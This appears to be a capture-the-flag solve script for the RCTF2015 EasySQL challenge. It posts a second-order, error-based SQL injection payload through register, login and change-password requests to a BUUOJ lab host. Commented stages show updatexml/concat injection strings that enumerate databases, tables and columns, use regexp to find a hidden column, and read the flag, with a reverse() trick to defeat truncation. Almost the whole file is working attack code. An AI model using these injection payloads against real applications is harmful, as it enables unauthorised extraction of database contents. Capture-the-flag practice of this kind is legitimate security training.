# [RCTF2015]EasySQL
import requests
session = requests.session()
url = 'http://84463f15-7733-43f0-a850-6e20c92ccdbf.node4.buuoj.cn:81/register.php'

#爆库
#name = 'test"||(updatexml(1,concat(0x3a,(select(group_concat(schema_name))from(information_schema.schemata))),1))#'

#爆表
#name = 'test"^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#'

#爆列名(第一次获得的flag列名并不是完整的列名)
#name = 'test"^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name="flag"))),1)#'

#regexp正则爆完整列名
#name = 'test"^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name="users")&&(column_name)regexp("^r"))),1)#'

#爆数据(因为updatexml报错只能显示20个字符，所以还要把另一半显示出来)
# name = 'username=mochu7"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp("^f"))),1))#'

#逆序在输出一遍
name = 'test"^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp("^f")))),1)#'

#}4af6e7d54142   -ed3a-0784-720f-a7
#flag{eb26f47a-f027-4870-a3de-24145d7e6fa4}

data1 = {
	'username': name,
	'password': '123',
	'email': '123'
}
req1 = session.post(url,data=data1)


url2 = 'http://84463f15-7733-43f0-a850-6e20c92ccdbf.node4.buuoj.cn:81/login.php'
data2 = {
	'username': name,
	'password': '123'
}

req2 = session.post(url2,data2)


url3 = 'http://84463f15-7733-43f0-a850-6e20c92ccdbf.node4.buuoj.cn:81/changepwd.php'
data = {
	'newpass': '1234',
	'oldpass': '123'
}
req3 = session.post(url3,data)
print(req3.text)
